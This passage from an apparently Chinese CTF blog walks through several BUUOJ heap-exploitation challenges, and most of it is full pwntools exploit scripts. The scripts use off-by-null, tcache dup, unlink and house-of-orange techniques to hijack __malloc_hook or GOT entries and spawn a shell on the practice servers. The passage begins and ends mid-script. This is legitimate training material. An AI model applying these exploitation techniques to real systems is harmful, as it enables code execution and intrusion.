chunk</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        delete(<span class="number">1</span>)</span><br><span class="line">        add(<span class="number">2</span>,<span class="number">0</span>)</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    libc_leak = show(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(libc_leak))</span><br><span class="line">    stdin_fd = libc_leak + (<span class="number">0xc9deba00</span> - <span class="number">0xc9debca0</span>)+<span class="number">0x70</span></span><br><span class="line">    add(<span class="number">2</span>,stdin_fd&amp;<span class="number">0xffff</span>)</span><br><span class="line">    add(<span class="number">1</span>,<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">1</span>,<span class="number">666</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment">#p = process(filename)</span></span><br><span class="line">    p = remote(ip,port)</span><br><span class="line">    pwn()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h2 id="hitcon-2018-children-tcache"><a href="#hitcon-2018-children-tcache" class="headerlink" title="hitcon_2018_children_tcache"></a>hitcon_2018_children_tcache</h2><p>虽然题目说是children_tcache 但是 tcache之前还有一步off-one-byte</p>
<p>一般有off-one-byte的情况下，可以伪造prev_size 直接向前合并，或者用how2heap里面缩小第二个chunk 两种方式。 两种有各自的方便之处，对于这题，有个问题是free后 会全部填充垃圾数据，这让第二种方式更加困难，因此考虑第一种方式。</p>
<p>在libc2.28 之前 consolidate不检查size是否相同，可以不用伪造size。</p>
<p>这里伪造prev_size利用了off_by_null反复覆盖的方式。</p>
<p>合并之后就是经典的泄露libc地址然后double_free 打tcache_dup</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&#x27;node5.buuoj.cn&#x27;</span></span><br><span class="line">port = <span class="number">29423</span></span><br><span class="line">libc_name = <span class="string">&#x27;../../glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so&#x27;</span></span><br><span class="line">filename = <span class="string">&#x27;./hitcon_2018_children_tcache&#x27;</span></span><br><span class="line">elf = ELF(filename)</span><br><span class="line">libc = ELF(libc_name)</span><br><span class="line">context.binary = filename</span><br><span class="line"></span><br><span class="line">ru  = <span class="keyword">lambda</span> a:     p.recvuntil(a)</span><br><span class="line">r   = <span class="keyword">lambda</span> :      p.recv()</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b:   p.sendlineafter(a,b)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b:   p.sendafter(a,b)</span><br><span class="line">sl  = <span class="keyword">lambda</span> a:     p.sendline(a)</span><br><span class="line">s   = <span class="keyword">lambda</span> a:     p.send(a)</span><br><span class="line">itob = <span class="keyword">lambda</span> a:    <span class="built_in">str</span>(a).encode(<span class="string">&#x27;l1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">index</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Your choice: &#x27;</span>,itob(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,data</span>):</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Size:&#x27;</span>,itob(size))</span><br><span class="line">    sa(<span class="string">b&#x27;Data:&#x27;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Index:&#x27;</span>,itob(index))</span><br><span class="line">    <span class="keyword">return</span> p.recvline(<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Index:&#x27;</span>,itob(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    add(<span class="number">0x500</span>,<span class="string">b&#x27;a&#x27;</span>) <span class="comment"># 0</span></span><br><span class="line">    add(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>) <span class="comment"># 1</span></span><br><span class="line">    add(<span class="number">0x5f0</span>,<span class="string">b&#x27;a&#x27;</span>) <span class="comment"># 2</span></span><br><span class="line">    add(<span class="number">0x20</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>) <span class="comment"># 3</span></span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">        add(<span class="number">0x68</span>-i,<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x68</span>-i))</span><br><span class="line">        delete(<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">0x68</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x60</span>+p64(<span class="number">0x580</span>)) <span class="comment">#0</span></span><br><span class="line">    delete(<span class="number">2</span>) <span class="comment"># consolidate</span></span><br><span class="line">    add(<span class="number">0x500</span>,<span class="string">b&#x27;a&#x27;</span>) <span class="comment"># 1</span></span><br><span class="line">    libc_leak = u64(show(<span class="number">0</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    libc_base = libc_leak - (<span class="number">0x7280e03ebca0</span>-<span class="number">0x00007280e0000000</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">    libc.address = libc_base</span><br><span class="line">    malloc_hook = libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    og=[<span class="number">0x4f2be</span>,<span class="number">0x4f2c5</span>,<span class="number">0x4f322</span>,<span class="number">0x10a38c</span>]</span><br><span class="line">    add(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>) <span class="comment">#2</span></span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">0x68</span>, p64(malloc_hook)) <span class="comment">#0</span></span><br><span class="line">    add(<span class="number">0x68</span>,<span class="string">b&#x27;\n&#x27;</span>) <span class="comment">#2</span></span><br><span class="line">    add(<span class="number">0x68</span>, p64(libc_base+og[<span class="number">2</span>]) ) <span class="comment">#4</span></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">   <span class="comment"># p = process(filename)</span></span><br><span class="line">    p = remote(ip,port)</span><br><span class="line">    pwn()</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<p>这里甚至还不能改__free_hook 因为我们写入的&#x2F;bin&#x2F;sh free时会被直接控制。</p>
<h2 id="gyctf-2020-signin"><a href="#gyctf-2020-signin" class="headerlink" title="gyctf_2020_signin"></a>gyctf_2020_signin</h2><p>这题目标很明显，要求控制ptr不为0，但是限制很多 ，其中影响较大的就是只能edit一次，显然这一次要用在打tcache 。那么也就是说即使我们分配到了，也无法直接edit ，这让我想到了如果分配到那个位置，还能再free掉，就能重新入链。但是tcache本身有free时size合理性的检查，所以这也不行。</p>
<p>看了网上的wp ，才知道这题利用了一个很偏门的性质，就是在fastbin取出chunk时，fastbin剩下的部分会接到tcache中。</p>
<p>然后calloc又只会从fastbin中取出。</p>
<p>综合上述性质 就可以打通这题了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">ip = <span class="string">&#x27;node5.buuoj.cn&#x27;</span></span><br><span class="line">port = <span class="number">25494</span></span><br><span class="line">libc_name = <span class="string">&#x27;../../glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so&#x27;</span></span><br><span class="line">filename = <span class="string">&#x27;./gyctf_2020_signin&#x27;</span></span><br><span class="line">elf = ELF(filename)</span><br><span class="line">libc = ELF(libc_name)</span><br><span class="line">context.binary = filename</span><br><span class="line"></span><br><span class="line">ru  = <span class="keyword">lambda</span> a:     p.recvuntil(a)</span><br><span class="line">r   = <span class="keyword">lambda</span> :      p.recv()</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b:   p.sendlineafter(a,b) </span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b:   p.sendafter(a,b)</span><br><span class="line">sl  = <span class="keyword">lambda</span> a:     p.sendline(a)</span><br><span class="line">s   = <span class="keyword">lambda</span> a:     p.send(a)</span><br><span class="line">itob = <span class="keyword">lambda</span> a:    <span class="built_in">str</span>(a).encode(<span class="string">&#x27;l1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">index</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;your choice?&#x27;</span>,itob(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index</span>):</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;idx?&#x27;</span>,itob(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;idx?\n&#x27;</span>,itob(index))</span><br><span class="line">    s(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;idx?\n&#x27;</span>,itob(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">backdoor</span>():</span><br><span class="line">    menu(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        add(i)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        delete(i)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">8</span>)</span><br><span class="line">    payload = p64(<span class="number">0x4040C0</span>-<span class="number">0x10</span>)</span><br><span class="line">    edit(<span class="number">7</span>,payload)</span><br><span class="line">    backdoor()</span><br><span class="line">    p.interactive()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment">#p = process(filename)</span></span><br><span class="line">    p = remote(ip,port)</span><br><span class="line">    pwn()</span><br></pre></td></tr></table></figure>



<h2 id="zctf-2016-note3"><a href="#zctf-2016-note3" class="headerlink" title="zctf_2016_note3"></a>zctf_2016_note3</h2><p>zctf你他妈一个漏洞能一直出题</p>
<p>还就那个size等于0 导致 unsigned无限比较</p>
<p>后面就是unlink</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&#x27;node5.buuoj.cn&#x27;</span></span><br><span class="line">port = <span class="number">29095</span></span><br><span class="line">libc_name = <span class="string">&#x27;../../glibc-all-in-one/libs/libc6_2.23-0ubuntu11_amd64/lib/x86_64-linux-gnu/libc-2.23.so&#x27;</span></span><br><span class="line">filename = <span class="string">&#x27;./zctf_2016_note3&#x27;</span></span><br><span class="line">elf = ELF(filename)</span><br><span class="line">libc = ELF(libc_name)</span><br><span class="line">context.binary = filename</span><br><span class="line"></span><br><span class="line">ru  = <span class="keyword">lambda</span> a:     p.recvuntil(a)</span><br><span class="line">r   = <span class="keyword">lambda</span> :      p.recv()</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b:   p.sendlineafter(a,b)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b:   p.sendafter(a,b)</span><br><span class="line">sl  = <span class="keyword">lambda</span> a:     p.sendline(a)</span><br><span class="line">s   = <span class="keyword">lambda</span> a:     p.send(a)</span><br><span class="line">itob = <span class="keyword">lambda</span> a:    <span class="built_in">str</span>(a).encode(<span class="string">&#x27;l1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">index</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;uit\noption---&gt;&gt;&#x27;</span>, itob(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>):</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Input the length of the note content:(less than 1024)&#x27;</span>, itob(size))</span><br><span class="line">    sa(<span class="string">b&#x27;Input the note content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Input the id of the note:&#x27;</span>, itob(index))</span><br><span class="line">    sa(<span class="string">b&#x27;Input the new content:&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Input the id of the note:&#x27;</span>, itob(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    add(<span class="number">0x0</span>,<span class="string">b&#x27;a\n&#x27;</span>) <span class="comment">#0</span></span><br><span class="line">    add(<span class="number">0x210</span>,<span class="string">b&#x27;a\n&#x27;</span>) <span class="comment">#1</span></span><br><span class="line">    add(<span class="number">0xf0</span>,<span class="string">b&#x27;a\n&#x27;</span>) <span class="comment">#2</span></span><br><span class="line">    add(<span class="number">0x90</span>,<span class="string">b&#x27;/bin/sh\n&#x27;</span>) <span class="comment">#3</span></span><br><span class="line">    add(<span class="number">0x90</span>,<span class="string">b&#x27;a\n&#x27;</span>) <span class="comment">#4</span></span><br><span class="line">    add(<span class="number">0x90</span>,<span class="string">b&#x27;a\n&#x27;</span>) <span class="comment">#5</span></span><br><span class="line">    add(<span class="number">0x90</span>,<span class="string">b&#x27;a\n&#x27;</span>) <span class="comment">#6</span></span><br><span class="line">    add(<span class="number">0x90</span>,<span class="string">b&#x27;a\n&#x27;</span>) <span class="comment">#7</span></span><br><span class="line">    ptr = <span class="number">0x6020C8</span></span><br><span class="line">    edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x221</span>)+ p64(<span class="number">0</span>) + p64(<span class="number">0x210</span>) + p64(<span class="number">0x6020d0</span>-<span class="number">0x18</span>) + p64(<span class="number">0x6020d0</span>-<span class="number">0x10</span>)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x221</span>)+ p64(<span class="number">0</span>)+ p64(<span class="number">0x211</span>) + p64(<span class="number">0x6020d0</span>-<span class="number">0x18</span>) + p64(<span class="number">0x6020d0</span>-<span class="number">0x10</span>) + <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x210</span>-<span class="number">0x20</span>) + p64(<span class="number">0x210</span>) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    edit(<span class="number">1</span>,p64(<span class="number">0</span>)*<span class="number">2</span> + p64(elf.sym[<span class="string">&#x27;got.free&#x27;</span>])[:<span class="number">7</span>]+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    puts_plt = <span class="number">0x400730</span></span><br><span class="line">    edit(<span class="number">0</span>,p64(puts_plt)[:<span class="number">7</span>]+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    edit(<span class="number">1</span>,p64(<span class="number">0</span>)*<span class="number">2</span> + p64(elf.sym[<span class="string">&#x27;got.atoi&#x27;</span>])[:<span class="number">7</span>]+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    p.recvline()</span><br><span class="line">    libc_leak = u64(p.recvline(<span class="literal">False</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    libc_base = libc_leak - libc.sym[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">    libc.address = libc_base</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">    system = libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    edit(<span class="number">1</span>,p64(<span class="number">0</span>)*<span class="number">2</span> + p64(elf.sym[<span class="string">&#x27;got.free&#x27;</span>])[:<span class="number">7</span>]+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    edit(<span class="number">0</span>,p64(system)[:<span class="number">7</span>]+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    delete(<span class="number">3</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment">#p = process(filename)</span></span><br><span class="line">    p = remote(ip, port)</span><br><span class="line">    pwn()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="house-of-orange-hitcon"><a href="#house-of-orange-hitcon" class="headerlink" title="house_of_orange_hitcon"></a>house_of_orange_hitcon</h2><p>根据网上的wp又做了一下这道题</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&#x27;node5.buuoj.cn&#x27;</span></span><br><span class="line">port = <span class="number">29752</span></span><br><span class="line">libc_name = <span class="string">&#x27;../../glibc-all-in-one/libs/libc6_2.23-0ubuntu11_amd64/lib/x86_64-linux-gnu/libc-2.23.so&#x27;</span></span><br><span class="line">filename = <span class="string">&#x27;./houseoforange_hitcon_2016&#x27;</span></span><br><span class="line">elf = ELF(filename)</span><br><span class="line">libc = ELF(libc_name)</span><br><span class="line">context.binary = filename</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ru  = <span class="keyword">lambda</span> a:     p.recvuntil(a)</span><br><span class="line">r   = <span class="keyword">lambda</span> :      p.recv()</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b:   p.sendlineafter(a,b)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b:   p.sendafter(a,b)</span><br><span class="line">sl  = <span class="keyword">lambda</span> a:     p.sendline(a)</span><br><span class="line">s   = <span class="keyword">lambda</span> a:     p.send(a)</span><br><span class="line">itob = <span class="keyword">lambda</span> a:    <span class="built_in">str</span>(a).encode(<span class="string">&#x27;l1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">index</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Your choice :&#x27;</span>,itob(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,data</span>):</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Length of name :&#x27;</span>,itob(size))</span><br><span class="line">    sa(<span class="string">b&#x27;Name :&#x27;</span>,data)</span><br><span class="line">    sla(<span class="string">b&#x27;Price of Orange&#x27;</span>,itob(<span class="number">1</span>))</span><br><span class="line">    sla(<span class="string">b&#x27;Color of Orange&#x27;</span>,itob(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">size,content</span>):</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Length of name :&#x27;</span>,itob(size))</span><br><span class="line">    sa(<span class="string">b&#x27;Name:&#x27;</span>,content)</span><br><span class="line">    sla(<span class="string">b&#x27;Price of Orange:&#x27;</span>,itob(<span class="number">1</span>))</span><br><span class="line">    sla(<span class="string">b&#x27;Color of Orange:&#x27;</span>,itob(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;index:&#x27;</span>,itob(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    sla(<span class="string">b&#x27;Your choice&#x27;</span>,itob(<span class="number">2</span>))</span><br><span class="line">    ru(<span class="string">b&#x27;Name of house : &#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> p.recvline(<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    add(<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    edit(<span class="number">0x40</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x21</span>)+p64(<span class="number">0x0000000200000001</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0xfa1</span>))</span><br><span class="line">    add(<span class="number">0x1000</span>,<span class="string">b&#x27;c&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">    add(<span class="number">0x400</span>,<span class="string">b&#x27;d&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">    libc_leak = u64(show()[<span class="number">8</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    libc_base=libc_leak-<span class="number">0x3c5188</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">    libc.address = libc_base</span><br><span class="line">    io_list_all = libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">    system = libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    edit(<span class="number">0x20</span>,<span class="string">b&#x27;e&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">    heap_leak = u64(show()[<span class="number">16</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(heap_leak))</span><br><span class="line"><span class="comment">## unsortedbin attack</span></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x400</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(system)+p64(<span class="number">0</span>)</span><br><span class="line">    payload +=<span class="string">b&#x27;/bin/sh\x00&#x27;</span> + p64(<span class="number">0x61</span>) <span class="comment">#fake chunk/IOFILE</span></span><br><span class="line">    payload += p64(<span class="number">0</span>) + p64(io_list_all-<span class="number">0x10</span>)</span><br><span class="line">    payload += p64(<span class="number">0</span>) + p64(<span class="number">1</span>)    <span class="comment"># _IO_write_base &amp; _IO_write_ptr</span></span><br><span class="line">    payload += p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">    payload += p64(heap_leak+<span class="number">0x430</span>) <span class="comment">#chain</span></span><br><span class="line">    payload += p64(<span class="number">0</span>)*<span class="number">13</span></span><br><span class="line">    payload += p64(heap_leak + <span class="number">0x508</span>)</span><br><span class="line">    payload += p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(system)</span><br><span class="line">    edit(<span class="number">0x1000</span>,payload)</span><br><span class="line"></span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    p.send(<span class="string">b&#x27;cat /flag&#x27;</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">   <span class="comment"># p = process(filename)</span></span><br><span class="line">    p = remote(ip,port)</span><br><span class="line">    pwn()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>





<p>瑞幸首席幸运官lucky: ！！！！<br>瑞幸首席幸运官lucky: 怎么想都想不通<br>瑞幸首席幸运官lucky: <a target="_blank" rel="noopener" href="https://www.cnblogs.com/ZIKH26/articles/16712469.html">https://www.cnblogs.com/ZIKH26/articles/16712469.html</a><br>瑞幸首席幸运官lucky: [图片]<br>瑞幸首席幸运官lucky: 这里最后那个unsoredbin不是last remainder吗  最后一步申请也只是申请0x20大小 怎么还会归类到smallbin中!<br>瑞幸首席幸运官lucky: [动画表情]<br>瑞幸首席幸运官lucky: ！ 我知道了！<br>瑞幸首席幸运官lucky: 我唐完了<br>瑞幸首席幸运官lucky: [图片]<br>瑞幸首席幸运官lucky: 原来检测是否是最后一个unsoredbin这么草率！<br>Y²: hello，hacker！</p>
<p><strong>没话说!</strong></p>
<h2 id="gyctf"><a href="#gyctf" class="headerlink" title="gyctf"></a>gyctf</h2><p>wyh集合与图论，下课后，速通一道堆题。</p>
<p>这题给的功能太多了! 有些我都不知道有什么用！  打法我感觉有好多！ 但我还就那个 one_gadget 填入 __malloc_hook!   </p>
<p>%3$p 泄露rcx 里面有好东西!</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&#x27;node5.buuoj.cn&#x27;</span></span><br><span class="line">port = <span class="number">26883</span></span><br><span class="line">libc_name = <span class="string">&#x27;./../../glibc-all-in-one/libs/libc6_2.23-0ubuntu11_amd64/lib/x86_64-linux-gnu/libc-2.23.so&#x27;</span></span><br><span class="line">filename = <span class="string">&#x27;./gyctf_2020_some_thing_interesting&#x27;</span></span><br><span class="line">elf = ELF(filename)</span><br><span class="line">libc = ELF(libc_name)</span><br><span class="line">context.binary = filename</span><br><span class="line"></span><br><span class="line">ru  = <span class="keyword">lambda</span> a:     p.recvuntil(a)</span><br><span class="line">r   = <span class="keyword">lambda</span> :      p.recv()</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b:   p.sendlineafter(a,b)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b:   p.sendafter(a,b)</span><br><span class="line">sl  = <span class="keyword">lambda</span> a:     p.sendline(a)</span><br><span class="line">s   = <span class="keyword">lambda</span> a:     p.send(a)</span><br><span class="line">itob = <span class="keyword">lambda</span> a:    <span class="built_in">str</span>(a).encode(<span class="string">&#x27;l1&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">index</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;&gt; Now please tell me what you want to do :&#x27;</span>,itob(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>():</span><br><span class="line">    menu(<span class="number">0</span>)</span><br><span class="line">    ru(<span class="string">b&#x27;OreOOrereOOreO&#x27;</span>)</span><br><span class="line">    leak = <span class="built_in">int</span>(p.recvline(<span class="literal">False</span>),<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span> leak</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size1,data1,size2,data2</span>):</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;&gt; O\&#x27;s length : &#x27;</span>,itob(size1))</span><br><span class="line">    sla(<span class="string">b&#x27;&gt; O :&#x27;</span>,data1)</span><br><span class="line">    sla(<span class="string">b&#x27;&gt; RE\&#x27;s length : &#x27;</span>,itob(size2))</span><br><span class="line">    sla(<span class="string">b&#x27;&gt; RE : &#x27;</span>,data2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,data1,data2</span>):</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;ID :&#x27;</span>,itob(index))</span><br><span class="line">    sla(<span class="string">b&#x27;&gt; O :&#x27;</span>,data1)</span><br><span class="line">    sla(<span class="string">b&#x27;&gt; RE :&#x27;</span>,data2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;ID : &#x27;</span>,itob(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    sla(<span class="string">b&#x27;&gt; Input your code please:&#x27;</span>,<span class="string">b&#x27;OreOOrereOOreO%3$p&#x27;</span>)</span><br><span class="line">    libc_base = check() - libc.sym[<span class="string">&#x27;write&#x27;</span>] - <span class="number">16</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">    libc.address = libc_base</span><br><span class="line">    target = libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] - <span class="number">0x23</span></span><br><span class="line">    add(<span 